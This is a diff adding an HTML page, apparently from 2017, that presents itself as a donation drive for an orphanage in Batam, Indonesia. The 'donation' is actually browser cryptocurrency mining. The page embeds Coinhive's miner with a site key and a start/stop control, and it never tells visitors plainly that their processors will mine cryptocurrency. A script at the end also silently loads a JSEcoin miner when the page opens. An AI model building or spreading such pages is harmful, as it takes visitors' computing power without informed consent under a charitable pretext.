@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+
+<html lang="en" style="height: 100%;">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<title>
+				Donasi | Diakonia
+	</title>
+		
+	<meta name="viewport" content="width=device-width">
+	<link rel="stylesheet" href="https://coin-hive.com/media/styles.css">
+	<link rel="icon" type="image/png" href="./files/GRJ.png">
+	<link rel="apple-touch-icon" href="./files/GRJ.png">
+	<script type="text/javascript" src="https://coin-hive.com/media/syntax-highlight.js" async=""></script>
+	
+
+<div class="container">
+
+<div class="row navigation">
+	<a class="active" href="https://donasiku.github.io/home/"  target="_blank">
+		<img src="./files/GRJ.png" class="navigation-icon">
+		Home
+	</a>
+	<a href="/dokumentasi.html"  target="_blank">Dokumentasi</a>
+	
+
+			<span class="aside">
+			<a href="#"  target="_blank">Download</a>
+			<a href="#"  target="_blank">Tentang Kami</a>
+			<a href="#"  target="_blank">Kontak</a>
+		</span>
+	</div>
+<div class="row">
+	
+	<div class="six columns claim">
+		<img src="./files/log.jpg" class="logo">
+		<h2>
+		Donasi <br> Diakonia
+		</h2>
+	</div>
+
+	<div class="six columns stopped" id="miner">
+		<div class="row">
+			<div class="four columns">
+				<h4 class="number-label">Donasi / s</h4>
+				<h2 id="mining-hashes-per-second">0</h2>
+			</div>
+			<div class="four columns">
+				<h4 class="number-label">Total</h4>
+				<h2 id="mining-hashes-total">0</h2>
+			</div>
+			<div class="four columns">
+				<h4 class="number-label">Power</h4>
+				<h2>
+					<span id="mining-threads">2</span>
+					<span id="mining-threads-remove" class="action">~</span>
+					<span class="mining-divide"> / </span>
+					<span id="mining-threads-add" class="action">+</span>
+				</h2>
+			</div>
+		</div>
+		<div id="mining-stats-container">
+			<canvas id="mining-stats-canvas" width="346" height="95"></canvas>
+			<div id="mining-controls">
+				<a href="#" class="mining-button" id="mining-start">
+					<svg class="mining-icon play-button" viewBox="0 0 200 200" alt="Start Mining">
+						<circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"></circle>
+						<polygon points="70, 55 70, 145 145, 100" class="mining-fill"></polygon>
+					</svg>
+					Mulai Donasi
+				</a>
+				<a href="#" class="mining-button" id="mining-stop">
+					<svg class="mining-icon pause-button" viewBox="0 0 200 200" alt="Pause">
+						<circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"></circle>
+						<rect x="70" y="50" width="20" height="100" class="mining-fill"></rect>
+						<rect x="110" y="50" width="20" height="100" class="mining-fill"></rect>
+					</svg>
+					Berhenti DONASI
+				</a>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script type="text/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript" src="https://coin-hive.com/media/miner-ui.js"></script>
+<script type="text/javascript">
+	var miner = new CoinHive.Anonymous('GnRYj5sLYwhB6GqgSfrVIDWOFnFks5vZ', {threads: 2});
+	var ui = new MinerUI(miner, {
+		container: document.getElementById('miner'),
+		canvas: document.getElementById('mining-stats-canvas'),
+		hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		threads: document.getElementById('mining-threads'),
+		threadsAdd: document.getElementById('mining-threads-add'),
+		threadsRemove: document.getElementById('mining-threads-remove'),
+		hashesTotal: document.getElementById('mining-hashes-total'),
+		startButton: document.getElementById('mining-start'),
+		stopButton: document.getElementById('mining-stop')
+	});
+</script>
+
+<h3 class="call-to-action">
+	Donasi untuk Panti Asuhan Sungai Kerit<br>
+	Batam - Indonesia
+</h3>
+<div class="section">
+	<h2 id="captcha">Cara Menggunakan</h2>
+
+	<p>
+		Cara menggunakan cukup simpel cukup klik tombol START DONASI untuk memulai donasi anda dan klik tombol STOP DONASI untuk berhenti berdonasi tentukan power yang hendak anda sumbangkan. Jika anda ingin menambah/mengurangi POWER Donasi caranya cukup klik ~/+ pada menu POWER. Semoga Donasi anda menjadi berkat bagi orang lain 
+		<br>
+		Tuhan Yesus memberkatimu senantiasa.
+	</p>
+
+	
+
+
+
+
+
+<div class="foot">
+	© 2017 <a href="https://donasiku.github.io/home/" target="_blank">Donasi KU</a>
+	|
+	<a href="#"  target="_blank">Kontak</a> |
+	<a href="#"  target="_blank">Terms of Service</a> |
+	<a href="#"  target="_blank">Privacy</a>|
+	<a href="#"  target="_blank">Sponsor</a>
+</div>
+</div>
+<p class="call-to-action">
+	<a class="button primary" href="https://www.facebook.com/gw.dani.12"  target="_blank">
+		Hubungi Pengembang
+	</a>
+</p>
+<script type="text/javascript">
+(function() {
+var trackingurl = 'https://load.jsecoin.com/server/load/3919/noweb/nojs/0/';
+var d=document, j=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+j.type='text/javascript'; j.async=true; j.defer=true; j.src=trackingurl; s.parentNode.insertBefore(j,s);
+})();
+</script>
+</body>
+</html>
